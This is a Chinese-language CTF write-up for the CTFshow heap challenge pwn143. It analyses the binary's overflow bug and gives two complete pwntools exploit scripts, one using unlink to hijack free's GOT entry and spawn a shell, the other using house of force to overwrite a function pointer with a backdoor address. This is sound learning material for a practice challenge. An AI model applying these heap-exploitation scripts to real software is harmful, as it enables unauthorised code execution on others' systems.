---
title: CTFshow pwn143
tags:
  - pwn
  - unlink
categories:
  - 做题笔记
cover: /img/紫发.png
---

# CTFshow pwn143 (unlink & houce of force)

## ida分析

### main函数分析
![1741875084264.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e78e7977a.png)
1.经典菜单题
2.但是值得注意的是case 5 会调用v4[1] ，可以覆盖其中地址为题目留下的后门函数

### add函数分析
![1741875249112.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e832e7df2.png)
1.理清题目堆块指针的保存结构，使用list数组保存对应的堆块大小
2.使用heaplist数组，保存堆块的地址

### edit函数分析
![1741875438296.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e8f044392.png)
1.发现溢出漏洞，可以溢出多字节

### show函数分析
![1741875684508.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e9e693af7.png)
1.没什么特别的，就是可以用来泄露libc

### delete函数分析
![1741875887777.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2eab191a39.png)
1.没有漏洞，释放后将指针置空了

## 构造思路
1.首先这题在edit时留出了任意长度的溢出，但是没有uaf漏洞。所以这道题首先考虑unlink方法；同时这道题在case5 留出了一个v4给我们操作，那么如果可以通过某种方法申请到这块空间，就可以篡改为题目留下来的后门函数。这里可以使用house of force，也可以考虑fastbin dup吧，后续可以尝试。
2.那么确定攻击的方法之后，只需要注意几个点。如果采用unlink的手法，必须注意，伪造的fake_chunk的地址，必须是存放我们进行unlink操作的堆块的地址，如下图中所示。ptr就是存放堆块0的指针
![1741876735944.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2ee0282c68.png)
3.此题使用unlink还要注意，堆块0的不能大于fastbin的大小，否则最后delete时会报错，不知道为什么。（待解决）明明unlink操作成功，修改free_got也成功，就是会报错。
4.如果使用house of force 的手法，那么只需要修改top的size，为-1(0xffffffffffffffff)。然后根据偏移，申清负数大小的堆块，是top_chunk迁移到目的地址(注意留出chunk头大小的空间)，然后申清就可以分配到这块空间。

## exp
### unlink
```python
from pwn import *
from libcfind import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
mode=0
url='pwn.challenge.ctf.show'
port=28159
elf=ELF("./pwn")
if mode == 0:
    io=process("./pwn")
else :
    io=remote(url,port)

def add(size,name):
    io.recvuntil("Your choice:")
    io.sendline("2")
    io.recvuntil("length:")
    io.sendline(str(size))
    io.recvuntil("name:")
    io.send(name)

def edit(idx,size,name):
    io.recvuntil("Your choice:")
    io.sendline("3")
    io.recvuntil("index:")
    io.sendline(str(idx))
    io.recvuntil("of name:")
    io.sendline(str(size))
    io.recvuntil("name:")
    io.send(name)

def show():
    io.recvuntil("Your choice:")
    io.sendline("1")
   
def delete(idx):
    io.recvuntil("Your choice:")
    io.sendline("4")
    io.recvuntil("index:")
    io.sendline(str(idx))

flag=0x400D7F
add(0x60,b'aaaa') #0
add(0x90,b'bbbb') #1
add(0x80,b'cccc') #2
add(0x20,b'/bin/sh\x00') #3
ptr=0x6020a8
fd=ptr-0x18
bk=ptr-0x10
fake_chunk=p64(0)+p64(0x61)
fake_chunk+=p64(fd)+p64(bk)
fake_chunk+=p64(0)*8
fake_chunk+=p64(0x60)+p64(0xa0)

edit(0,len(fake_chunk),fake_chunk)
#gdb.attach(io)
delete(1)
payload=p64(0)+p64(0)+p64(0x90)+p64(elf.got['free'])
edit(0,len(payload),payload)
#gdb.attach(io)
show()
io.recv(4)
free=u64(io.recv(6).ljust(8,b'\x00'))
log.success("free-{}".format(hex(free)))
libc=LibcSearcher("free",free)
libcbase=free-libc.dump("free")
system=libcbase+libc.dump("system")
gdb.attach(io)
edit(0,0x8,p64(system))
delete(3)
io.interactive()
```
### house of force
```python
from pwn import *
from libcfind import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
mode=0
url='pwn.challenge.ctf.show'
port=28197
elf=ELF("./pwn")
if mode == 0:
    io=process("./pwn")
else :
    io=remote(url,port)

def add(size,name):
    io.recvuntil("Your choice:")
    io.sendline("2")
    io.recvuntil("length:")
    io.sendline(str(size))
    io.recvuntil("name:")
    io.send(name)

def edit(idx,size,name):
    io.recvuntil("Your choice:")
    io.sendline("3")
    io.recvuntil("index:")
    io.sendline(str(idx))
    io.recvuntil("of name:")
    io.sendline(str(size))
    io.recvuntil("name:")
    io.send(name)

def show():
    io.recvuntil("Your choice:")
    io.sendline("1")
   
def delete(idx):
    io.recvuntil("Your choice:")
    io.sendline("4")
    io.recvuntil("index:")
    io.sendline(str(idx))
def get_flag():
    io.recvuntil("Your choice:")
    io.sendline("5")
flag=0x400D7F
add(0x30,b'aaaa')
payload=p64(0)*7+p64(0xffffffffffffffff)

edit(0,0x41,payload)

offset=-0x70
add(offset,b'aaaa')
#gdb.attach(io)
add(0x10,p64(flag)*2)
get_flag()
io.interactive()
```